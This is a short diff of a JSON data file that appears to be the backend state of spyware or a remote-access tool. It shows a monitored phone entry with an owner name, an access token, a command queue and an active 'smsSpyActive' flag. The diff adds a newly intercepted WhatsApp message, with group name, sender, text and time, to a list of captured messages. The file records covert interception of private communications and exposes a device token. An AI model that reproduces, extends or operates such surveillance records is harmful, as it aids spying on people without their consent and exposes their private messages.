@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777182933069,
+    "lastSeen": 1777182939276,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
@@ -4053,6 +4053,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Cwe cantik[(/ only 7 members",
+        "content": "~ rizzzzx: Lucu kan",
+        "time": "26/04 13:55",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777182935008
+      },
       {
         "appName": "WhatsApp",
         "sender": "Cwe cantik[(/ only 7 members: ~ rizzzzx",
